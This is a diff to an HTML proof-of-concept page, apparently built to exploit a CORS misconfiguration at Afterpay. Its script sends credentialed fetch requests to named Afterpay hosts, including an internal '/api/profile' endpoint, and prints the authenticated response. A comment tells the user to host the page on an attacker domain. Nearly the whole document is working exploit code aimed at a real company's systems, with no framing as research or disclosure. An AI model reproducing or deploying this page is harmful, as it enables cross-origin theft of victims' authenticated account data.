@@ -1,21 +1,28 @@
 <!DOCTYPE html>
 <html>
   <head>
-    <title>🔥 CORS Exploit PoC2</title>
+    <title>🔥 Afterpay CORS Exploit PoC</title>
   </head>
   <body>
-    <h2>🔥 CORS Exploit PoC</h2>
+    <h2>🔥 Afterpay CORS Exploit PoC</h2>
     <p>Trying to fetch authenticated content from: <b>https://dq-testing-dev.corp.afterpay.com</b></p>
-    <pre id="output"></pre>
+    <pre id="output">Loading...</pre>
 
     <script>
-      fetch("https://connect.afterpay.com/some/api/endpoint", {
+      // Change this to a real endpoint you discover
+      const targetUrl = "https://dq-testing-dev.corp.afterpay.com/api/profile";
+
+      fetch(targetUrl, {
         method: "GET",
-        credentials: "include"
+        credentials: "include",
+        // You cannot manually set Origin in fetch, so run this on your attacker domain!
       })
-      .then(res => res.text())
+      .then(response => {
+        if (!response.ok) throw new Error("HTTP error " + response.status);
+        return response.text();
+      })
       .then(data => {
-        document.getElementById("output").textContent = data;
+        document.getElementById("output").textContent = data || "(empty response)";
       })
       .catch(err => {
         document.getElementById("output").textContent = "❌ Error:\n" + err;
